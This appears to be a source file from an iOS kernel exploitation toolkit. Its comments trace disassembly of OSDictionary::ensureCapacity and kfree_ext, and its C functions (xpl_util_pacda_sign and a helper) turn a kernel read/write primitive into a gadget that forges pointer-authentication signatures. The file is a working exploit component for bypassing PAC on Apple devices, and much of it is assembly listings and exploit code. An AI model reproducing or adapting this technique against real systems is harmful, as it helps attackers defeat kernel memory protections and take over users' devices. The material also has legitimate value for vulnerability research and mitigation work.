...
///
/// This module provides functionality for signing arbitary values with arbitary modifiers using
/// DA pointer authentication key
///
///
/// The instance variable `dictionary` of class `OSDictionary` stores the the address of array
/// containing keys and values in the dictionary. This variable is signed using `DA` pointer
/// authentication key
///
...
/// }
/// 
/// The array pointed by the `dictionary` variable is dynamically allocated as required. When a
/// new value is added to the dictionary using `OSDictionary::setObject`, the method calls
/// `OSDictionary::ensureCapacity` method to allocate a larger `dictionary` array if the dictionary
/// is full
///
/// bool
/// OSDictionary::
...
//  ...
/// // Construct modifier for authenticating or signing data pointer `OSDictionary::dictionary`
//  0xfffffe0007921154      mov       x8, x19
//  0xfffffe0007921158      ldr       x16, [x8, #0x20]!
//  0xfffffe000792115c      mov       x23, x8
//  0xfffffe0007921160      movk      x23, #0xa486, LSL#48
//  ...
/// // Set x9 = `OSDictionary::capacity`
//  0xfffffe00079212c0      ldr       w9, [x19, #0x18]
/// // Set x8 = `OSDictionary::dictionary`
//  0xfffffe00079212c4      ldr       x8, [x19, #0x20]
// ...
/// // Authenticate `OSDictionary::dictionary` pointer using PACDA
//  0xfffffe00079212e0      mov       x16, x8
//  0xfffffe00079212e4      autda     x16, x23
//  0xfffffe00079212e8      mov       x17, x16
//  0xfffffe00079212ec      xpacd     x17
//  0xfffffe00079212f0      cmp       x16, x17
//  0xfffffe00079212f4      b.eq      0xfffffe00079212fc
//  0xfffffe00079212f8      brk       #0xc472
...
/// // ***NOTE***: Just before pacda this method is called
//  0xfffffe000792131c      bl        kfree_type_var_impl_internal
/// // ***NOTE***: x21 and x23 are callee-saved registers
//  0xfffffe0007921320      pacda     x21, x23
/// // Store the signed newDict to `OSDictionary::dictionary`
//  0xfffffe0007921324      str       x21, [x19, #0x20]
/// Store finalCapacity to `OSDictionary::capacity`
//  0xfffffe0007921328      str       w20, [x19, #0x18]
/// // Set the return value of function to finalCapacity
...
//
/// As noted in the code snippet above, just before the `pacda` instruction, the method
/// `kfree_type_var_impl_internal` is called to release the old `dictionary` array. The operands of
/// `pacda` instruction are `x21` and `x23` and it signs the data pointer in register `x21` using
/// modifier in `x23` and saves the result to register `x21`. Both `x21` and `x23` are callee-saved
/// registers and callee functions are supposed to save these registers on stack before using them
/// and restore their values from stack before returning. Unlike LR, these registers are saved and
/// restored from stack without any protection.
///
/// This means that if we have a reliable method to modify the values of `x21` and `x23` saved
/// on kernel stack while the method `kfree_type_var_impl_internal` is called, we can sign arbitary
/// pointers with arbitary modifiers and since the signed result is saved to `OSDictionary::dictionary`
/// field, we can easily read the signed value from there.
///
...
/// stack, but we have to make sure `x21` an `x23` are restored from kernel stack once we release
/// the `&map->lock`
///
/// The method `kfree_ext` does use `x21 and x23` registers and hence it saves these registers
/// to kernel stack. But it restores their values before calling `kfree_large` method as shown below:
///
//  void kfree_ext(kalloc_heap_t kheap, void* data, vm_size_t size):
//
//  0xfffffe00072b81bc     pacibsb
//  0xfffffe00072b81c0     sub        sp, sp, #0x70
/// // Saves the callee-saved registers used
//  0xfffffe00072b81c4     stp        x24, x23, [sp, #0x30]
//  0xfffffe00072b81c8     stp        x22, x21, [sp, #0x40]
//  0xfffffe00072b81cc     stp        x20, x19, [sp, #0x50]
//  0xfffffe00072b81d0     stp        x29, x30, [sp, #0x60]
//  0xfffffe00072b81d4     add        x29, sp, #0x60
/// // Saves argument `size` to x19
//  0xfffffe00072b81d8     mov        x19, x2
/// // Saves argument `data` to x20
//  0xfffffe00072b81dc     mov        x20, x1
/// // Saves argument `kheap` to x21
//  0xfffffe00072b81e0     mov        x21, x0
//  ...
/// // Checks if `kalloc_max_prerounded` <= `size`
//  0xfffffe00072b8200     adrp       x8, -0x1fff8ebd000
//  0xfffffe00072b8204     ldr        x8, [x8, #0xd80]
//  0xfffffe00072b8208     cmp        x8, x19
//  0xfffffe00072b820c     b.hi       0xfffffe00072b825c
//  ...
/// // Sets arg1 = `kheap`
//  0xfffffe00072b8228     mov        x0, x22
/// // Sets arg2 = `data`
//  0xfffffe00072b822c     mov        x1, x20
/// // Sets arg3 = `size`
//  0xfffffe00072b8230     mov        x2, x19
/// // Restores callee-saved registers from stack
//  0xfffffe00072b8234     ldp        x29, x30, [sp, #0x60]
//  0xfffffe00072b8238     ldp        x20, x19, [sp, #0x50]
//  0xfffffe00072b823c     ldp        x22, x21, [sp, #0x40]
//  0xfffffe00072b8240     ldp        x24, x23, [sp, #0x30]
//  0xfffffe00072b8244     add        sp, sp, #0x70
/// // Authenticates LR
//  0xfffffe00072b8248     autibsp
//  0xfffffe00072b824c     eor        x16, x30, x30, LSL#0x1
//  0xfffffe00072b8250     tbz        x16, #0x3e, 0xfffffe00072b8258
//  0xfffffe00072b8254     brk        #0xc471
/// // Branches to kfree_large method
//  0xfffffe00072b8258     b          kfree_large
//  ...
//
...
/// // ***NOTE***: x21 saved to kernel stack
//  0xfffffe00072b83fc     stp        x22, x21, [sp, #0x50]
...
/// // ***NOTE***: x21 restored from kernel stack
//  0xfffffe00072b861c     ldp        x22, x21, [sp, #0x50]
...
/// has acquired the rw lock `map->lock`. So we can control the value of `x23` by modifying the
/// stack used by this method.
//
//  0xfffffe00072c8e58     pacibsp
//  0xfffffe00072c8e5c     sub        sp,sp,#0x80
//  0xfffffe00072c8e60     stp        x28,x27,[sp, #local_60]
//  0xfffffe00072c8e64     stp        x26,x25,[sp, #local_50]
/// // ***NOTE***: Saves x23 to stack
//  0xfffffe00072c8e68     stp        x24,x23,[sp, #local_40]
//  0xfffffe00072c8e6c     stp        x22,x21,[sp, #local_30]
//  0xfffffe00072c8e70     stp        x20,x19,[sp, #local_20]
//  0xfffffe00072c8e74     stp        x29,x30,[sp, #local_10]
//  ...
//  0xfffffe00072c9210     ldp        x29=>local_10,x30,[sp, #0x70]
//  0xfffffe00072c9214     ldp        x20,x19,[sp, #local_20]
//  0xfffffe00072c9218     ldp        x22,x21,[sp, #local_30]
/// // ***NOTE***: Restores x23 from stack
//  0xfffffe00072c921c     ldp        x24,x23,[sp, #local_40]
//  0xfffffe00072c9220     ldp        x26,x25,[sp, #local_50]
//  0xfffffe00072c9224     ldp        x28,x27,[sp, #local_60]
//  0xfffffe00072c9228     add        sp,sp,#0x80
//  0xfffffe00072c922c     retab
//
///
...
void xpl_util_pacda_prepare_dict_for_switch(IOSurfaceRef surface, uintptr_t dict, uint32_t desired_capacity) {
    ...
    xpl_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, desired_capacity);
}
...
uintptr_t xpl_util_pacda_sign(uintptr_t ptr, uint64_t ctx) {
    ...
    /// props dictionary
    uintptr_t signed_ptr = xpl_kmem_read_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET);
    
    /// Reset the props dictionary
    xpl_kmem_write_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICTIONARY_OFFSET, 0);
    xpl_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    
    /// Cleanup
    IOSurfaceDecrementUseCount(surface_ref);
    
    xpl_log_debug("signed ptr %p, result: %p", (void*)ptr, (void*)signed_ptr);
    return signed_ptr;
}
